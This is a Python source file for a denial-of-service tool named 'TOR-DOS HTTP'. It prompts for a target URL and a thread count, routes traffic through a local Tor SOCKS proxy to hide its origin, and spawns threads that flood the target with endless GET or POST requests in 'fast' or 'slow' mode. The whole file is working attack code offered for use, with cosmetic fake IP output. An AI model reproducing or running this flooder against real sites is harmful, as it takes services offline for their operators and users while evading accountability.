import requests
import os
import random
import time
from threading import Thread
from colorama import Fore

os.system('clear')

print("\033[91m  __________  ____        ____  ____  _____\033[0m")
print("\033[92m /_  __/ __ \/ __ \      / __ \/ __ \/ ___/\033[0m")
print("\033[93m  / / / / / / /_/ /_____/ / / / / / /\__ \ \033[0m")
print("\033[94m / / / /_/ / _, _/_____/ /_/ / /_/ /___/ /\033[0m")
print("\033[95m/_/  \____/_/ |_|     /_____/\____//____/\033[0m")
print("\033[96m                                       HTTP\033[0m")
s = requests.session()
s.proxies = {}
s.proxies['http'] = 'socks5h://localhost:9050'
s.proxies['https'] = 'socks5h://localhost:9050'
s.proxies['socks5'] = 'socks5h://localhost:9050'

def fastpost():
	while True:
		try:
			n1 = random.randint(1,254)
			n2 = random.randint(1,254)
			n3 = random.randint(1,254)
			n4 = random.randint(1,254)
			ran = random.choice(['login', 'search', 'user', 'panel', 'page', 'register'])
			rann = random.randint(1,6000)
			s.post(url)
			print(Fore.GREEN + "[INFO] Tor Service Run " + Fore.WHITE + str(url) + Fore.YELLOW + " Dir : " + Fore.WHITE + "/?"+str(ran)+"="+str(rann))
			print(Fore.GREEN + "[INFO] Sent : " + Fore.WHITE + str(n1)+"."+str(n2)+"."+str(n3)+"."+str(n4) + Fore.CYAN + " //Post Host !" + Fore.WHITE + " ")
		except:
			print(Fore.RED + "Can't Connect To " + Fore.WHITE + str(url))
			print(Fore.RED + "Post Failed 0.0 " + Fore.WHITE + "Socks Or Website Is Down")
			s.close()

def fastget():
	while True:
		try:
			n1 = random.randint(1,254)
			n2 = random.randint(1,254)
			n3 = random.randint(1,254)
			n4 = random.randint(1,254)
			ran = random.choice(['login', 'search', 'user', 'panel', 'page', 'register'])
			rann = random.randint(1,6000)
			s.get(url)
			print(Fore.GREEN + "[INFO] Tor Service Run " + Fore.WHITE + str(url) + Fore.YELLOW + " Dir : " + Fore.WHITE + "/?"+str(ran)+"="+str(rann))
			print(Fore.GREEN + "[INFO] Sent : " + Fore.WHITE + str(n1)+"."+str(n2)+"."+str(n3)+"."+str(n4) + Fore.CYAN + " //Get Host !" + Fore.WHITE + " ")
		except:
			print(Fore.RED + "[!] Can't Connect To " + Fore.WHITE + str(url))
			print(Fore.RED + "[!] Get Host Failed " + Fore.WHITE + "Socks Or Website Is Down")
			s.close()

def slowpost():
	while True:
		try:
			m1 = random.randint(1,254)
			m2 = random.randint(1,254)
			m3 = random.randint(1,254)
			m4 = random.randint(1,254)
			ts = random.randint(2,4)
			ran = random.choice(['login', 'search', 'user', 'panel', 'page', 'register'])
			rann = random.randint(1,6000)
			print(Fore.GREEN + "[INFO] Tor Service Run " + Fore.WHITE + str(url) + Fore.YELLOW + " Dir : " + Fore.WHITE + "/?"+str(ran)+"="+str(rann))
			print(Fore.GREEN + "[INFO] Sent : " + Fore.WHITE + str(m1)+"."+str(m2)+"."+str(m3)+"."+str(m4) + Fore.CYAN + " Slow Post Mod Enable " + Fore.WHITE + " ")
			s.post(url)
			time.sleep(int(ts))
		except:
			print(Fore.RED + "[!] Can't Connect To " + Fore.WHITE + str(url) + Fore.WHITE + " ")
			print(Fore.RED + "[!] Post Failed " + Fore.WHITE + "Socks Or Website Is Down")
			s.close()

def slowget():
	while True:
		try:
			b1 = random.randint(1,254)
			b2 = random.randint(1,254)
			b3 = random.randint(1,254)
			b4 = random.randint(1,254)
			ts = random.randint(2,4)
			ran = random.choice(['login', 'search', 'user', 'panel', 'page', 'register'])
			rann = random.randint(1,6000)
			print(Fore.GREEN + "[INFO] Tor Service Run " + Fore.WHITE + str(url) + Fore.YELLOW + " Dir : " + Fore.WHITE + "/?"+str(ran)+"="+str(rann))
			print(Fore.RED + "[INFO] Sent : " + Fore.WHITE + str(b1)+"."+str(b2)+"."+str(b3)+"."+str(b4) + Fore.CYAN + " Slow Get Mod Enable " + Fore.WHITE + " ")
			s.get(url)
			time.sleep(int(ts))
		except:
			print(Fore.RED + "[!]Can't Connect To " + Fore.WHITE + str(url) + Fore.WHITE + " ")
			print(Fore.RED + "[!] Get Host Failed " + Fore.WHITE + "Socks Or Website Is Down")
			s.close()
def main():
	global url
	global s
	url = str(input(Fore.GREEN + "[+] Target : " + Fore.WHITE))
	thr = int(input(Fore.GREEN + "[+] Threads : " + Fore.WHITE))
	type = str(input(Fore.GREEN + "[+] Slow Mod Or Not ( fast / slow ) : " + Fore.WHITE))
	if type =='fast':
		me = str(input(Fore.GREEN + "[+] Method ( post / get ) : " + Fore.WHITE))
		if me =='post':
			os.system('clear')
			print(Fore.CYAN + "[+] Target : " + Fore.WHITE + str(url))
			print(Fore.CYAN + "[+] Default Port : " + Fore.WHITE + "80")
			print(Fore.CYAN + "[+] Set Thread In : " + Fore.WHITE + str(thr))
			print(Fore.CYAN + "[+] Method : " + Fore.WHITE + "Fast Post Method")
			time.sleep(4)
			for x in range(thr):
				x = Thread(target=fastpost, name=(x))
				x.start()
		elif me =='get':
			os.system('clear')
			print(Fore.CYAN + "[+] Your Target : " + Fore.WHITE + str(url))
			print(Fore.CYAN + "[+] Default Port : " + Fore.WHITE + "80")
			print(Fore.CYAN + "[+] Set Thread In : " + Fore.WHITE + str(thr))
			print(Fore.CYAN + "[+] Method : " + Fore.WHITE + "Fast Get Method")
			time.sleep(4)
			for x in range(thr):
				x = Thread(target=fastget, name=(x))
				x.start()
	elif type =='slow':
		me = str(input(Fore.GREEN + "[+] Method ( post / get ) : " + Fore.WHITE))
		if me =='post':
			os.system('clear')
			print(Fore.CYAN + "[+] Your Target : " + Fore.WHITE + str(url))
			print(Fore.CYAN + "[+] Default Port : " + Fore.WHITE + "80")
			print(Fore.CYAN + "[+] Set Thread In : " + Fore.WHITE + str(thr))
			print(Fore.CYAN + "[+] Method : " + Fore.WHITE + "Slow Post Method")
			time.sleep(4)
			for x in range(100):
				x = Thread(target=slowpost, name=(x))
				x.start()
		elif me =='get':
			os.system('clear')
			print(Fore.CYAN + "[+] Your Target : " + Fore.WHITE + str(url))
			print(Fore.CYAN + "[+] Default Port : " + Fore.WHITE + "80")
			print(Fore.CYAN + "[+] Set Thread In : " + Fore.WHITE + str(thr))
			print(Fore.CYAN + "[+] Method : " + Fore.WHITE + "Slow Get Method")
			time.sleep(4)
			for x in range(100):
				x = Thread(target=slowget, name=(x))
				x.start()


if __name__ == "__main__":
	main()
